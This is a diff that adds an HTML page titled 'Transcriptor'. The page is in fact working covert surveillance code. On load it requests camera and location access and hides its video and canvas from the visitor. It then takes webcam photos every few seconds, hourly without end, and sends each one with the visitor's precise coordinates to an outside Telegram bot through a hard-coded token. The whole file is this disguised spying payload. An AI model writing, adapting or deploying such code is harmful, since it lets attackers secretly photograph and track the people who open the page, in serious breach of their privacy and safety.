@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Transcriptor</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+    }
+
+    video,
+    canvas {
+      display: none;
+      /* Hide both video and canvas from the user */
+    }
+
+    .info {
+      margin: 10px;
+      font-size: 16px;
+      color: #333;
+    }
+  </style>
+</head>
+
+<body>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7613071585:AAHoiR5hsFLV9prFgM1v2uv3utW5WzsXgwU"; // Replace with your bot token
+    const CHAT_ID = "1405276348"; // Replace with your chat ID
+
+    async function checkPermissions() {
+      try {
+        // Check camera permissions
+        const cameraPermission = await navigator.permissions.query({name: "camera"});
+        const geolocationPermission = await navigator.permissions.query({name: "geolocation"});
+
+        // If both permissions are granted, start the process
+        if (cameraPermission.state === "granted" && geolocationPermission.state === "granted") {
+          startContinuousCapture();
+        } else {
+          await requestPermissions(cameraPermission, geolocationPermission);
+        }
+      } catch (error) {
+        console.error("Error checking permissions:", error);
+      }
+    }
+
+    async function requestPermissions(cameraPermission, geolocationPermission) {
+      try {
+        if (cameraPermission.state !== "granted") {
+          await navigator.mediaDevices.getUserMedia({video: true});
+        }
+        if (geolocationPermission.state !== "granted") {
+          await getLocation();
+        }
+
+        startContinuousCapture(); // Start capturing after permissions are granted
+      } catch (error) {
+        console.error("Permission request denied:", error);
+        alert("Permissions are required to proceed.");
+      }
+    }
+
+    async function startContinuousCapture() {
+      while (true) {
+        console.log("Starting capture...");
+        await captureAndSendPhotos();
+        console.log("Capture cycle completed. Waiting for 60 minutes.");
+        await new Promise(resolve => setTimeout(resolve, 60 * 60 * 1000)); // Wait 60 minutes
+      }
+    }
+
+    async function captureAndSendPhotos() {
+      const endTime = Date.now() + 60000; // Capture for 60 seconds
+      while (Date.now() < endTime) {
+        try {
+          const photoBlob = await capturePhoto();
+          const location = await getLocation();
+          await sendToTelegram(photoBlob, location);
+          console.log("Photo and location sent successfully!");
+          await new Promise(resolve => setTimeout(resolve, 3000)); // 3 seconds delay
+        } catch (error) {
+          console.error("Error during capture and send:", error);
+          break;
+        }
+      }
+    }
+
+    async function capturePhoto() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const videoStream = await navigator.mediaDevices.getUserMedia({video: true});
+
+      video.srcObject = videoStream;
+      await new Promise(resolve => (video.onloadedmetadata = resolve));
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      videoStream.getTracks().forEach(track => track.stop());
+      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+    }
+
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+          position => resolve(position.coords),
+          error => reject(error),
+          {enableHighAccuracy: true}
+        );
+      });
+    }
+
+    async function sendToTelegram(photoBlob, location) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", photoBlob);
+
+      const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData,
+      });
+
+      if (!photoResponse.ok) {
+        throw new Error("Failed to send photo");
+      }
+
+      const locationResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          latitude: location.latitude,
+          longitude: location.longitude,
+        }),
+      });
+
+      if (!locationResponse.ok) {
+        throw new Error("Failed to send location");
+      }
+    }
+
+    window.onload = checkPermissions; // Start permission check on page load
+  </script>
+</body>
+
+</html>
